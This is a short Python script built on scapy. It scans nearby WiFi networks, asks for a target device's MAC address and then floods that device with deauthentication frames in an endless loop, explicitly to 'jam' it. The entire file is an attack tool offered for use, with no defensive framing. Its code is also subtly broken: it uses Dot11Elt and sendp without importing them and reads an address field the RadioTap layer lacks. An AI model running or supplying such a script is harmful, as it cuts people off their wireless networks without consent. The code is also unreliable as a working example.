import os
import time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sniff

# Function to scan and print WiFi information, including interface and MAC
def scan_wifi_info(pkt):
    if pkt.haslayer(Dot11):
        bssid = pkt[Dot11].addr2
        ssid = pkt[Dot11Elt].info.decode()
        interface_type = pkt[RadioTap].present
        interface_mac = pkt[RadioTap].addr2
        print(f"SSID: {ssid} | BSSID: {bssid} | Interface Type: {interface_type} | Interface MAC: {interface_mac}")

# Set your wireless interface
interface = input("Set your Wireless Interface: ")

# Start scanning for WiFi networks
sniff(iface=interface, prn=scan_wifi_info, timeout=10)

# Set the target's MAC address
target_mac = input("Insert Target's MAC Address: ")

while True:
    # Craft the deauthentication packet
    deauth_packet = RadioTap() / Dot11(addr1=target_mac, addr2="ff:ff:ff:ff:ff:ff", addr3="ff:ff:ff:ff:ff:ff") / Dot11Deauth(reason=7)

    # Send the packet repeatedly to jam the target
    for _ in range(100):
        sendp(deauth_packet, iface=interface, verbose=False)

    # Pause for a moment before sending more deauth packets
    time.sleep(5)
